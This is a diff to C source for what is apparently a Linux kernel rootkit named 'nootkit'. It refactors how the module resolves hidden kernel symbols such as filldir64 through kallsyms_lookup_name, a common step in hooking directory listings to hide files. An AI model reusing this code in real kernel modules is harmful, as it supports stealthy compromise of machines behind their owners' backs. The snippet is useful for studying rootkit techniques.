@@ -1,17 +1,35 @@
 #include <linux/types.h>
+#include <linux/kernel.h>
+#include <linux/printk.h>
 
-#include "ksyms.h"
+#include <ksyms.h>
 
-unsigned long (*kallsyms_lookup_name)(const char *name) = 0;
+unsigned long (*ksyms__kallsyms_lookup_name)(const char *name) = 0;
 
-int (*filldir64)(struct dir_context *ctx, const char *name, int namlen,
-    loff_t offset, u64 ino, unsigned int d_type) = 0;
+/**
+ * Define all symbols as global function pointers initialized to NULL.
+ */
+#define KSYM_OP(retn, symbol, ...) \
+retn (*ksyms__##symbol)(__VA_ARGS__) = NULL
+KSYMS_ALL();
+#undef KSYM_OP
 
-int (*verify_dirent_name)(const char *name, int len) = 0;
+int resolve_ksyms(void *kallsyms_lookup_name) {
+    ksyms__kallsyms_lookup_name = kallsyms_lookup_name;
 
-void resolve_ksyms(void *kallsyms_lookup_name_p) {
-    kallsyms_lookup_name = kallsyms_lookup_name_p;
+    /**
+     * Resolve all defined symbols, returning on any failure.
+     */
+    #define KSYM_OP(retn, symbol, ...)                                                  \
+    do {                                                                                \
+        ksyms__##symbol = (void *)ksyms__kallsyms_lookup_name(#symbol);                 \
+        if (ksyms__##symbol == NULL) {                                                  \
+            printk(KERN_ERR "nootkit: ksyms: Symbol %s failed to resolve", #symbol);    \
+            return 1;                                                                   \
+        }                                                                               \
+    } while (0)
+    KSYMS_ALL();
+    #undef KSYM_OP
 
-    filldir64 = (void *)kallsyms_lookup_name("filldir64");
-    verify_dirent_name = (void *)kallsyms_lookup_name("verify_dirent_name");
+    return 0;
 }
